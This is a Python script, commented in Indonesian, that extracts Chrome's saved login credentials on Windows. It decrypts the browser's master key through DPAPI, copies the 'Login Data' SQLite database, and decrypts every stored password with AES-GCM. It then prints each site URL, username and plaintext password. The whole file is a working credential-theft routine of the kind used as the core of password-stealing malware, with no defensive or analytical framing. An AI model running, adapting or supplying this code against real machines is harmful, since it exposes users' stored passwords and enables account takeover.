import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


def dapatkan_waktu_chrome(chromedate):
    """Mengembalikan objek datetime.datetime dari waktu format chrome Karena chromedate diformatkan sebagai jumlah mikrodetik dimulai dari Januari, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def dapatkan_kunci_enkripsi():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State",
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # mendekode kunci enkripsi dari Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # menghapus DPAPI str
    key = key[5:]
    # mengembalikan kunci terdekripsi yang awalnya dienkripsi
    # menggunakan kunci sesi yang berasal dari kredensial masuk pengguna saat ini
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def dekripsi_password(password, key):
    try:
        # mendapatkan vektor inisialisasi
        iv = password[3:15]
        password = password[15:]
        # menghasilkan cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # mendekripsi password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # kecuali tidak didukung
            return ""


def main():
    # mendapatkan kunci AES
    key = dapatkan_kunci_enkripsi()
    # path database Chrome lokal sqlite
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "default",
        "Login Data",
    )
    # mengcopy file ke lokasi lain
    # karena database akan terkunci jika chrome sedang berjalan
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # terhubung ke database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # tabel logins memiliki data yang kami butuhkan
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
    )
    # mengulang semua baris
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = dekripsi_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            print(f"URL Asal: {origin_url}")
            print(f"URL Aksi: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Tanggal Pembuatan: {str(dapatkan_waktu_chrome(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Terakhir Digunakan: {str(dapatkan_waktu_chrome(date_last_used))}")
        print("=" * 50)

    cursor.close()
    db.close()
    try:
        # mencoba untuk menghapus file db yang disalin
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    main()
